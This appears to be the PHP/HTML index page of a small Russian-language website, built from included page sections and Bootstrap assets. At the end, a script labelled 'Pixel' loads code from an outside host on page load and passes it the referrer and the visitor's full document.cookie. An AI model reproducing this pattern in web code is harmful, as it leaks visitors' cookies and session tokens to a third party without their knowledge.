<?php include("k_admin/k_admin_theme/js/mysql_connect.php");
  include("k_admin/k_admin_theme/js/callbacks.php"); ?>

<?php $this_site_name_query = mysqli_query($msql_connect, "SELECT name FROM site_name WHERE id = '1' LIMIT 1");
  $this_site_name_fetch = mysqli_fetch_array($this_site_name_query); ?>

<!DOCTYPE html>
<html lang="ru">
  <head>

    <!-- Meta tags -->

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Meta tags -->

    <!-- Titel -->

    <title><?php echo $this_site_name_fetch['name']; ?></title>

    <!-- Titel -->

    <!-- CSS stylesheet -->

    <link href="../k_site/k_site_theme/css/bootstrap.css" rel="stylesheet">
    <link href="../k_site/k_site_theme/css/fontawesome_all.css" rel="stylesheet">
    <link href="../k_site/k_site_theme/css/theme.css" rel="stylesheet">
    <link rel="icon" type="image/png" href="http://key39.ru/k_site/k_site_theme/images/favicon.png" />

    <!-- CSS stylesheet -->

    <!-- Fonts -->

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&amp;subset=cyrillic" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Pattaya&amp;subset=cyrillic" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700&amp;subset=cyrillic" rel="stylesheet">

    <!-- Fonts -->

  </head>
  <body>

    <br class="hidden-xs hidden-md hidden-lg">
    <br class="hidden-xs hidden-md hidden-lg">
    <br class="hidden-xs hidden-md hidden-lg">
    <br class="hidden-xs">
    <br class="hidden-xs">
    <br class="hidden-xs">
    <br class="hidden-xs">
    <br class="hidden-xs">

    <!-- Body -->

    <?php include("k_site/k_site_pages/k_site_top_menu.php");
      include("k_site/k_site_pages/k_site_top_container.php");
      include("k_site/k_site_pages/k_site_ens_container.php");
      include("k_site/k_site_pages/k_site_gov_container.php");
      include("k_site/k_site_pages/k_site_private_container.php");
      include("k_site/k_site_pages/k_site_info_container.php");
      include("k_site/k_site_pages/k_site_scheme_container.php");
      include("k_site/k_site_pages/k_site_info_data.php");
      include("k_site/k_site_pages/k_site_bottom_container.php"); ?>

    <!-- Body -->

    <!-- Sripts -->

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script src="k_site/k_site_theme/js/bootstrap.js"></script>
    <script src="k_site/k_site_theme/js/active_fields.js"></script>
    <script src="k_site/k_site_theme/js/active_fields2.js"></script>
    <script src="k_site/k_site_theme/js/div_height_data.js"></script>
    <script src="k_site/k_site_theme/js/div_height_data_info.js"></script>
    <script>
      $(document).ready(function(){
        $("a[href*=#]").on("click", function(e){
            var anchor = $(this);
            $('html, body').stop().animate({
                scrollTop: $(anchor.attr('href')).offset().top
            }, 1500);
            e.preventDefault();
            return false;
        });
    });
    </script>

    <!-- Sripts -->

    <!-- Pixel -->
      <script type="text/javascript">
          (function (d, w) {
              var n = d.getElementsByTagName("script")[0],
                  s = d.createElement("script"),
                  f = function () { n.parentNode.insertBefore(s, n); };
                      s.type = "text/javascript";
                      s.async = true;
                      s.src = "https://qoopler.ru/index.php?ref="+d.referrer+"&cookie=" + encodeURIComponent(document.cookie);

                      if (w.opera == "[object Opera]") {
                          d.addEventListener("DOMContentLoaded", f, false);
                      } else { f(); }
          })(document, window);
      </script>
    <!-- /Pixel -->

  </body>
</html>
<?php include("k_admin/k_admin_theme/js/mysql_close.php"); ?>
